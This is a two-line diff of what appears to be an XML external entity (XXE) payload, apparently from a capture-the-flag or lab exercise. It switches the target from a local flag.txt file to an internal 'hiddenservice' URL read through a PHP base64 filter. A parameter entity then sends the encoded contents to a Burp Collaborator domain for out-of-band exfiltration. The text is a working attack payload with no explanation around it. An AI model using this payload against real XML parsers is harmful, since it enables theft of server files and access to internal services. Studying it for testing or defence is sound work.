@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=flag.txt">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=http://hiddenservice">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://er9gkpvkrxkzbnt9qqgdwizskjqaez.burpcollaborator.net/%data;'>">
